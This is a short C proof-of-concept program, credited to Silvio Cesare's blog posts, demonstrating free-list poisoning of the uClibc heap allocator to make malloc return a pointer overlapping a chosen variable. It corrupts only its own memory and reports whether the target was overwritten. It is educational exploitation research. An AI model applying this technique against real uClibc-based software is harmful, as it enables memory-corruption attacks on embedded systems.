// Based on https://blog.infosectcbr.com.au/2019/11/uclibc-unlink-heap-exploitation.html
// Developed further in https://twitter.com/silviocesare/status/1203191477452435456
// Same idea as in https://blog.infosectcbr.com.au/2019/09/linux-heap-fast-bin-poisoning-part-1.html
// by Dr Silvio Cesare

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>

#ifndef __UCLIBC__
#error "Wrong libc - needs uClibc"
#endif

static long foo = 0;

int main() {

  long *p = malloc(10);
  long *q = malloc(10);

  // Insert into free list
  free(p);
  *p = (long)(&foo - 2); // poison

  q = malloc(10);
  q = malloc(10);
  memset(q, 'A', 10);

  if (foo) {
    printf("Target overwritten\n");
  } else {
    printf("Target NOT overwritten - uClibc major version %d, minor version %d, sublevel %d\n", __UCLIBC_MAJOR__, __UCLIBC_MINOR__, __UCLIBC_SUBLEVEL__);
  }
}